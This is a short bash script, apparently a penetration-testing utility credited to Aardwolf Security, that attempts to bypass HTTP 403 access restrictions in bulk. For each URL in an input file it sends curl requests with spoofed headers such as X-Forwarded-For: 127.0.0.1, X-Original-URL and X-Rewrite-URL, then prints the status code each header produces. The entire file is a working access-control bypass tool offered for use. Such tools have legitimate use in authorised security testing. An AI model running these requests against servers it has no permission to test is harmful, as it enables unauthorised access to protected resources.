#!/bin/bash

figlet Bulk 403 Bypass
echo "                                               By Aardwolf Security"

# Check if input file is provided
if [ $# -eq 0 ]
then
    echo "Usage: $0 input_file"
    exit 1
fi

# Loop through the URLs in the input file
while read url
do
    # Test for known 403 bypasses
    echo "Testing: $url"
    curl -s -o /dev/null -w "X-Custom-IP-Authorization: 127.0.0.1 - %{http_code}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" --max-time 5 $url
    curl -s -o /dev/null -w "X-Original-URL: $url - %{http_code}\n" -H "X-Original-URL: $url" --max-time 5 $url
    curl -s -o /dev/null -w "X-Rewrite-URL: $url - %{http_code}\n" -H "X-Rewrite-URL: $url" --max-time 5 $url
    curl -s -o /dev/null -w "Referer: $url - %{http_code}\n" -H "Referer: $url" --max-time 5 $url
    curl -s -o /dev/null -w "X-Originating-IP: 127.0.0.1 - %{http_code}\n" -H "X-Originating-IP: 127.0.0.1" --max-time 5 $url
    curl -s -o /dev/null -w "X-Forwarded-For: 127.0.0.1 - %{http_code}\n" -H "X-Forwarded-For: 127.0.0.1" --max-time 5 $url
    curl -s -o /dev/null -w "X-Forwarded-Host: $url - %{http_code}\n" -H "X-Forwarded-Host: $url" --max-time 5 $url
    curl -s -o /dev/null -w "X-Forwarded-Server: $url - %{http_code}\n" -H "X-Forwarded-Server: $url" --max-time 5 $url
    curl -s -o /dev/null -w "X-Host: $url - %{http_code}\n" -H "X-Host: $url" --max-time 5 $url
    curl -s -o /dev/null -w "X-HTTP-Host-Override: $url - %{http_code}\n" -H "X-HTTP-Host-Override: $url" --max-time 5 $url
    curl -s -o /dev/null -w "X-Original-URL: /$((RANDOM%100000)) - %{http_code}\n" -H "X-Original-URL: /$((RANDOM%100000))" --max-time 5 $url
    echo "----------------------"

done < $1
